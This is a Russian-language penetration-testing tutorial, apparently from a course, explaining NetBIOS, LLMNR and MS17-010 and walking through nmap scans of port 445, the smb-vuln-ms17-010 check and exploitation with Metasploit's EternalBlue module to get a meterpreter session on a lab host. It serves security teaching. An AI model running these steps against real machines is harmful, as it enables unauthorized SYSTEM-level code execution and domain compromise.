### Основные понятия

**NBT** (NetBIOS over TCP/IP) — механизм отображения запросов NetBIOS на TCP/IP.

**Служба имен NetBIOS (NBT-NS)** — это протокол Windows, который используется для преобразования имен NetBIOS в
IP-адреса в
локальной сети.

**LLMNR, англ. Link-Local Multicast Name Resolution** — протокол стека TCP/IP, основанный на формате пакета данных DNS,
который позволяет компьютерам выполнять разрешение имен хостов в локальной сети.

**MS17-010** — обновление безопасности, устраняющее уязвимости в Microsoft Windows. Наиболее серьезная из уязвимостей
может
позволить удаленное выполнение кода, если злоумышленник отправит специально созданные сообщения на сервер Microsoft
Server Message Block 1.0 (SMBv1).

### Разбор базового примера

Вы получили доступ к локальной сети, ваша задача — найти Windows машины и попробовать поэксплуатировать обнаруженные
уязвимости для получения доступа к учетным записям домена и его сервисам.

Поиск машин Windows в локальной сети

Когда вы обнаружили существующие узлы в сети и хотите выявить среди них узлы Windows, стоит начать с:

Сканирования портов, принадлежащих Windows машинам
Изучения трафика широковещательных запросов, которые инициируют Windows машины
Ход действий

1. Проведем разведку Windows-машины, начнем со сканирования открытых портов:

> $ nmap -Pn -n -F -sT --open 192.168.10.0/24

2. Наибольший интерес тут представляет порт 445, используемый протоколом SMB для доступа к файлам и папкам и
   взаимодействия между хостами:

> $ nmap -Pn -n -p 445 -sC -v --open 192.168.10.4

3. Данная версия Windows может быть подвержена MS17-010 – критической уязвимости, позволяющей атакующему выполнить
   произвольный код с правами пользователя SYSTEM. Найдем и используем скрипт nmap для проверки хоста на уязвимости:

> $ find /usr/share/nmap/scripts -iname '*MS17*'

> /usr/share/nmap/scripts/smb-vuln-ms17-010.nse

> $ nmap -Pn -n -p 445 --script smb-vuln-ms17-010 -v --open 192.168.10.4

4. Для эксплуатации уязвимости используем Metasploit Framework:

> $ msfconsole

5. Выбираем эксплойт:

> msf6> search ms17-010

> msf6> use exploit/windows/smb/ms17_010_eternalblue

6. Указываем адрес удаленной машины:

> msf6> set RHOSTS 192.168.10.4

7. Запускаем эксплойт:

> msf6> run

После успешной эксплуатации уязвимости мы получаем доступ к управлению хостом с помощью meterpreter – С2-агента,
предоставляющего множество удобных средств для выполнения команд и различного кода на удаленном хосте, загрузки и
выгрузки файлов, использования хоста в качестве прокси-сервера и, главное, предоставление msf возможности выполнения
различных локальных модулей, автоматизирующих повышение прав и постэксплуатацию на машине.

8. Ознакомимся с основными возможностями meterpreter:

> meterpreter> help

9. Соберем информацию о системе и текущем пользователе:

> meterpreter> sysinfo

> meterpreter> getuid

### Общие принципы

Мы уже познакомились с различными аспектами сканирования локальной сети и внешней сети. Повторим важное:

Сканировать сеть следует, начиная с поиска узлов
После обнаружения узлов можно заняться сканированием сервисов на них
Искать стоит только те сервисы, с которыми вы знаете, что нужно делать
Соответственно, когда вы обнаружили существующие узлы в сети и хотите выявить среди них узлы Windows, стоит начать с:

Сканирования портов, принадлежащих Windows машинам
Изучения трафика широковещательных запросов, которые инициируют Windows машины
Далее рассмотрим две техники: обнаружения Windows-машин в сети и компрометации Windows-машин

